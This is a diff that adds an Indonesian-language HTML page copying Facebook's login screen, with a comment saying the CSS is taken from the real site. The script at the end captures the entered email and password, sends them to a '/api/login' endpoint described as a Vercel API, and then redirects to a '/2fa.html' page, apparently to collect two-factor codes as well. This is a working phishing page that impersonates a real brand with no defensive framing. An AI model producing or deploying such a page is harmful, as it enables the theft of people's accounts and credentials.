@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook – Masuk atau Daftar</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        /* COPY PASTE CSS DARI FACEBOOK ASLI */
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 80px auto;
+            padding: 20px;
+        }
+        .logo {
+            color: #1877f2;
+            font-size: 48px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .card {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+        .login-btn {
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            padding: 14px 16px;
+            width: 100%;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .forgot-link {
+            text-align: center;
+            margin: 16px 0;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #dadde1;
+        }
+        .forgot-link a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .signup-btn {
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            padding: 14px 16px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">facebook</div>
+        <div class="card">
+            <form id="loginForm">
+                <input type="text" id="email" placeholder="Email atau nomor telepon" required>
+                <input type="password" id="password" placeholder="Kata sandi" required>
+                <button type="submit" class="login-btn">Masuk</button>
+            </form>
+            <div class="forgot-link">
+                <a href="#">Lupa kata sandi?</a>
+            </div>
+            <hr style="margin: 20px 0; border: 0.5px solid #dadde1;">
+            <button class="signup-btn">Buat Akun Baru</button>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e){
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Kirim ke API Vercel
+            await fetch('/api/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({email, password})
+            });
+            
+            // Redirect ke 2FA
+            window.location.href = `/2fa.html?email=${encodeURIComponent(email)}`;
+        });
+    </script>
+</body>
+</html>
